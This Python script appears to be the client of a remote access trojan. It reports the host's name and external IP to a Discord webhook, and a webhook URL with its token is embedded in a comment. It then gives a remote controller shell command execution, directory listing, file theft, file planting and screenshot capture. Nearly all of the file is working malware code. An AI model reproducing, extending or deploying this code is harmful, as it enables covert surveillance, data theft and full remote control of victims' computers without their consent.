import socket
import os
import subprocess
from discord_webhook import DiscordWebhook
from requests import get
import pyscreenshot







host_name = socket.gethostname()
external_ip = get('https://api.ipify.org').text

Device_details = str(host_name) + ": "
Device_details += str(external_ip)


#create webhook
#Webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1054015735560683652/5hVwJ_-eH3zdbcb8rYiFrjny9kXIZSxBl72pHs0vDldNno6dLcCtI_J2yjOfhki44HgS',content=Device_details)
#response = Webhook.execute()


HOST = '127.0.0.1'
PORT = 8080


            
            
        
    
# command option
def command_option(command):
    msg = "Command output \n"
    msg += subprocess.check_output(command,shell=True, universal_newlines=True)
    return msg




with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as S:
    S.bind((HOST,PORT))
    S.listen()
    conn, addr = S.accept()
    with conn:
        print("Connected by :", addr)
        state_of_webhook = conn.recv(1024)
        state_of_webhook = state_of_webhook.decode()
        if(state_of_webhook == 'true'):
            webhook_raw = conn.recv(4096)
            webhook_raw = webhook_raw.decode()
            Webhook = DiscordWebhook(webhook_raw,content=Device_details)
            response = Webhook.execute()
        
        
        while True:
            data = conn.recv(2048)
            msg = data.decode()
            
            if msg == 'goto_dir':
                custom_dir = conn.recv(4096)
                custom_dir = custom_dir.decode()
                files = os.listdir(custom_dir)
                files = str(files)
                conn.sendall(files.encode())
           
            elif msg == 'dir_files':
                folder_dir = conn.recv(4096)
                folder_dir = folder_dir.decode()
                result = ''
                
                for path in os.listdir(folder_dir):
                    if os.path.isfile(os.path.join(folder_dir,path)):
                        result += str(path)+', '
                print(result)
                conn.sendall(result.encode())
                
                
                
            elif msg == 'download_file':
                file_path = conn.recv(4096)
                file_path = file_path.decode()
                file = open(file_path, "rb")
                data = file.read()
                conn.sendall(data)
           
            elif msg == 'inject_file':
                filename = conn.recv(4096)
                new_file = open(filename,"wb")
                data = conn.recv(1000000)
                new_file.write(data)
                new_file.close()
            elif msg == 'screenshot':
                # grab screenshot
                screenshot = pyscreenshot.grab()
                file_path = "screnshot.png"
                screenshot.save(file_path)
                
                # send back
                file = open(file_path,"rb")
                data = file.read()
                file.close()
                os.remove(file_path)
                conn.sendall(data)      
            else:
                    output = command_option(msg)
                    conn.sendall(str.encode(output))
                
                
                
                
                
            
            #output = command_option(msg)
            

            #conn.sendall(str.encode(output))